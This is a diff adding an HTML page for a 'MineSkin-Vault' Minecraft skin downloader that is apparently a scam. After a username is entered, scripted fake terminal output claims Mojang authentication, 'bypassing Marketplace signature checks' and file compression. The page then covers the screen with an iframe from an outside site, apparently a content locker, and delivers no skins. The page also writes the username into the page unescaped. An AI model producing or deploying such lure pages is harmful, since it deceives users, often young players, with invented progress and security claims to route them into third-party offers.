@@ -1,0 +1,334 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>MineSkin-Vault | Professional Skin Downloader v4.2.1</title>
+    <link href="https://fonts.googleapis.com/css2?family=Roboto+Mono:wght@400;700&family=Poppins:wght@400;600;800&display=swap" rel="stylesheet">
+    
+    <style>
+        :root {
+            --primary: #00FF57; 
+            --bg: #121212;
+            --card-bg: rgba(25, 25, 25, 0.95);
+            --text: #ffffff;
+            --text-muted: #888888;
+            --terminal-bg: #0d0d0d;
+        }
+
+        * { margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; outline: none; }
+
+        body {
+            font-family: 'Poppins', sans-serif;
+            background: var(--bg);
+            color: var(--text);
+            overflow-x: hidden;
+            background-image: radial-gradient(circle at 50% 10%, #1e1e1e 0%, #121212 100%);
+        }
+
+        body::before {
+            content: ''; position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background-image: linear-gradient(#1a1a1a 1px, transparent 1px), linear-gradient(90deg, #1a1a1a 1px, transparent 1px);
+            background-size: 30px 30px; opacity: 0.1; z-index: -2;
+            animation: gridMove 20s linear infinite;
+        }
+
+        @keyframes gridMove { from { background-position: 0 0; } to { background-position: 30px 30px; } }
+
+        header {
+            padding: 40px 20px;
+            text-align: center;
+            border-bottom: 1px solid rgba(255,255,255,0.05);
+            animation: fadeInDown 0.8s ease;
+        }
+
+        .logo {
+            font-size: 20px; font-weight: 800; letter-spacing: -0.5px;
+            text-transform: uppercase; color: var(--primary);
+            font-family: 'Poppins', sans-serif;
+        }
+
+        .tagline { font-size: 12px; color: var(--text-muted); margin-top: 5px; }
+
+        .container { max-width: 500px; margin: 0 auto; padding: 20px 15px 60px; }
+
+        .status-badge {
+            background: rgba(0, 255, 87, 0.1);
+            color: var(--primary);
+            padding: 8px 15px;
+            border-radius: 30px;
+            font-size: 11px;
+            font-weight: 600;
+            display: inline-flex;
+            align-items: center;
+            margin-bottom: 15px;
+        }
+        .status-dot { width: 6px; height: 6px; background: var(--primary); border-radius: 50%; margin-right: 8px; box-shadow: 0 0 10px var(--primary); animation: pulse 1.5s infinite; }
+        @keyframes pulse { 0% { opacity: 1; } 50% { opacity: 0.3; } 100% { opacity: 1; } }
+
+        .skin-grid { display: flex; flex-direction: column; gap: 20px; }
+
+        .skin-card {
+            background: var(--card-bg);
+            border: 1px solid rgba(255,255,255,0.03);
+            border-radius: 20px;
+            padding: 0;
+            overflow: hidden;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.3);
+            animation: fadeInUp 0.5s ease backwards;
+            transition: transform 0.2s ease, box-shadow 0.2s ease;
+        }
+
+        .skin-card:active { transform: scale(0.98); box-shadow: 0 5px 15px rgba(0,255,87,0.1); }
+
+        .skin-image-container {
+            width: 100%;
+            height: 220px; 
+            background-color: #1a1a1a;
+            position: relative;
+            display: flex; align-items: center; justify-content: center;
+            overflow: hidden;
+        }
+
+        .skin-image-container img {
+            width: 100%; height: auto;
+            object-fit: contain; 
+            transform: scale(1.05);
+            transition: transform 0.3s ease;
+        }
+        .skin-card:hover .skin-image-container img { transform: scale(1.1); }
+
+        .image-overlay {
+            position: absolute; bottom: 0; left: 0; width: 100%; height: 50%;
+            background: linear-gradient(to top, var(--card-bg) 0%, transparent 100%);
+        }
+
+        .skin-details { padding: 20px; position: relative; z-index: 1; margin-top: -20px;}
+
+        .skin-title-row {
+            display: flex; justify-content: space-between; align-items: center;
+            margin-bottom: 5px;
+        }
+
+        .skin-title { font-size: 16px; font-weight: 700; color: var(--text); }
+        .skin-meta { font-size: 11px; color: var(--text-muted); }
+
+        .btn-download {
+            background: #ffffff; color: #000000;
+            border: none; width: 100%; padding: 15px;
+            border-radius: 12px; font-weight: 700; font-size: 13px;
+            text-transform: uppercase; letter-spacing: 0.5px;
+            cursor: pointer; transition: 0.3s ease;
+            margin-top: 15px;
+            font-family: 'Poppins', sans-serif;
+        }
+
+        .btn-download:hover { background: var(--primary); color: #000; transform: translateY(-2px); }
+
+        .modal {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(0,0,0,0.92);
+            display: none; align-items: center; justify-content: center;
+            z-index: 1000; padding: 15px;
+            backdrop-filter: blur(20px);
+            animation: fadeIn 0.3s ease;
+        }
+
+        .modal-content {
+            background: #181818;
+            width: 100%; max-width: 400px;
+            border-radius: 25px; padding: 30px;
+            border: 1px solid rgba(255,255,255,0.05);
+            box-shadow: 0 20px 50px rgba(0,0,0,0.5);
+        }
+
+        .modal-title { font-size: 18px; font-weight: 700; margin-bottom: 5px; text-align: center; }
+        .modal-subtitle { font-size: 11px; color: var(--text-muted); margin-bottom: 25px; text-align: center; }
+
+        input, select {
+            width: 100%; background: rgba(255,255,255,0.03);
+            border: 1px solid rgba(255,255,255,0.06);
+            padding: 16px; border-radius: 12px; color: white;
+            margin-bottom: 12px; font-size: 15px; font-family: 'Poppins', sans-serif;
+            transition: border-color 0.2s;
+        }
+        input:focus, select:focus { border-color: var(--primary); }
+
+        #terminal {
+            background: var(--terminal-bg);
+            font-family: 'Roboto Mono', monospace;
+            padding: 20px; border-radius: 15px;
+            font-size: 11px; color: #aaaaaa;
+            height: 180px; overflow-y: hidden;
+            display: none; border: 1px solid #222;
+            line-height: 1.6;
+            margin-bottom: 20px;
+        }
+        .term-green { color: var(--primary); }
+        .term-cyan { color: var(--accent); }
+
+        .progress-container {
+            width: 100%; height: 5px; background: #222;
+            border-radius: 10px; margin: 15px 0; display: none; overflow: hidden;
+        }
+        .progress-bar {
+            width: 0%; height: 100%; background: var(--primary);
+            box-shadow: 0 0 15px var(--primary); border-radius: 10px;
+            transition: width 0.3s ease;
+        }
+
+        @keyframes fadeInUp { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
+        @keyframes fadeInDown { from { opacity: 0; transform: translateY(-20px); } to { opacity: 1; transform: translateY(0); } }
+        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
+
+        .mojang-verified {
+            font-size: 9px; color: #666; text-align: center; margin-top: 15px;
+            display: flex; align-items: center; justify-content: center; gap: 5px;
+        }
+    </style>
+</head>
+<body>
+
+<header>
+    <div class="status-badge"><div class="status-dot"></div> ACTIVE CONSOLE FEED</div><br>
+    <h1 class="logo">MINESKIN<span style="color:white">-VAULT</span></h1>
+    <p class="tagline">Global Premium Skin Database | Version 4.2.1</p>
+</header>
+
+<div class="container">
+    <div class="skin-grid">
+        <div class="skin-card" style="animation-delay: 0.1s">
+            <div class="skin-image-container">
+                <img src="https://imgur.com/datu8E5.png" alt="ANIME LEGENDS HD Pack Preview">
+                <div class="image-overlay"></div>
+            </div>
+            <div class="skin-details">
+                <div class="skin-title-row">
+                    <p class="skin-title">ANIME LEGENDS HD Pack [LIMITED]</p>
+                    <p class="skin-meta">10 Sinks</p>
+                </div>
+                <p style="font-size: 10px; color: #555;">K-Pop / Demon Slayer Mashup</p>
+                <button class="btn-download" onclick="openModal('Anime HD Pack')">SECURE DOWNLOAD</button>
+            </div>
+        </div>
+        
+        <div class="skin-card" style="animation-delay: 0.2s">
+            <div class="skin-image-container">
+                <img src="https://imgur.com/CIMjqXp.png" alt="Techwear Skin Preview">
+                <div class="image-overlay"></div>
+            </div>
+            <div class="skin-details">
+                <div class="skin-title-row">
+                    <p class="skin-title">TOP 10 NINAJAS SKIN Pack</p>
+                    <p class="skin-meta">10 Skins</p>
+                </div>
+                <p style="font-size: 10px; color: #555;">Neon Cyan Emissive Layers</p>
+                <button class="btn-download" onclick="openModal('Glitched Tech-wear')">SECURE DOWNLOAD</button>
+            </div>
+        </div>
+
+        <div class="skin-card" style="animation-delay: 0.3s">
+            <div class="skin-image-container">
+                <img src="https://imgur.com/ioOpTkp.png" alt="Movie Steve Skin Preview">
+                <div class="image-overlay"></div>
+            </div>
+            <div class="skin-details">
+                <div class="skin-title-row">
+                    <p class="skin-title">Anime School Life SKIN Pack</p>
+                    <p class="skin-meta">8 Skin</p>
+                </div>
+                <p style="font-size: 10px; color: #555;">8 cool school-themed skins!</p>
+                <button class="btn-download" onclick="openModal('Movie Steve Mod')">SECURE DOWNLOAD</button>
+            </div>
+        </div>
+    </div>
+</div>
+
+<div class="modal" id="modal">
+    <div class="modal-content">
+        <div id="step-form">
+            <h2 class="modal-title">Skin Database Access</h2>
+            <p class="modal-subtitle">Secure Download for: <span id="skin-name-display" class="term-cyan"></span></p>
+            <input type="text" id="username" placeholder="Minecraft Username">
+            <select id="platform">
+                <option value="PC">PC / Java Edition</option>
+                <option value="Bedrock">Bedrock / PE</option>
+                <option value="Console">Console (Xbox/PS5)</option>
+            </select>
+            <button class="btn-download" style="background: var(--primary); padding: 18px; margin-top: 25px;" onclick="startDownload()">AUTHORIZE DOWNLOAD</button>
+            <p class="mojang-verified">🛡️ Mojang API Connection Secure</p>
+        </div>
+
+        <div id="step-process" style="display:none;">
+            <h2 class="modal-title" style="margin-bottom: 20px;">Asset Retrieval Protocol</h2>
+            <div id="terminal"></div>
+            <div class="progress-container" id="p-cont"><div class="progress-bar" id="p-bar"></div></div>
+            <p class="mojang-verified">Fetching binary data... Do not close window.</p>
+        </div>
+    </div>
+</div>
+
+<div id="locker-container" style="display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.92); z-index:9999; justify-content:center; align-items:center;">
+    <div style="padding:15px; border-radius:15px; box-shadow:0 10px 40px rgba(0,0,0,0.6); position:relative; width:90%; max-width:350px; background: transparent;">
+        <iframe src="https://doctoredits.com/1888360" 
+                style="width:100%; height:450px; border:none; background:transparent;" 
+                scrolling="no" 
+                allowtransparency="true"></iframe>
+    </div>
+</div>
+
+<script>
+    const term = document.getElementById('terminal');
+    const pBar = document.getElementById('p-bar');
+
+    function openModal(name) {
+        document.getElementById('skin-name-display').innerText = name;
+        document.getElementById('modal').style.display = 'flex';
+        document.body.style.overflow = 'hidden';
+    }
+
+    function startDownload() {
+        const user = document.getElementById('username').value;
+        if(user.length < 3) { alert('Invalid Minecraft Username'); return; }
+
+        document.getElementById('step-form').style.display = 'none';
+        document.getElementById('step-process').style.display = 'block';
+        term.style.display = 'block';
+        document.getElementById('p-cont').style.display = 'block';
+
+        const logs = [
+            "[SYSTEM] <span class='term-green'>MineSkin-Vault v4.2.1 initialized.</span>",
+            "[SYSTEM] Connecting to global CDN servers...",
+            "[NETW] Establishing handshake with Mojang Auth [01]...",
+            "[AUTH] <span class='term-cyan'>User " + user + " authenticated [OK].</span>",
+            "[DATA] Searching Premium Skins database...",
+            "[DATA] Asset Bundle [HDK0192] located...",
+            "[FILE] Bypassing Marketplace signature checks...",
+            "[CORE] Extracting texture mapping data...",
+            "[CORE] Compressing binary skin package...",
+            "[SYSTEM] <span class='term-green'>Verification Protocol 409 triggered.</span>",
+            "[VERI] Preparing end-to-end device confirmation..."
+        ];
+
+        let i = 0;
+        const interval = setInterval(() => {
+            const line = document.createElement('div');
+            line.innerHTML = logs[i];
+            term.appendChild(line);
+            term.scrollTop = term.scrollHeight;
+            pBar.style.width = ((i + 1) / logs.length) * 100 + "%";
+            i++;
+            
+            if(i >= logs.length) {
+                clearInterval(interval);
+                setTimeout(() => {
+                    document.getElementById('modal').style.display = 'none';
+                    document.getElementById('locker-container').style.display = 'flex';
+                }, 1500); 
+            }
+        }, 800); 
+    }
+</script>
+
+</body>
+</html>
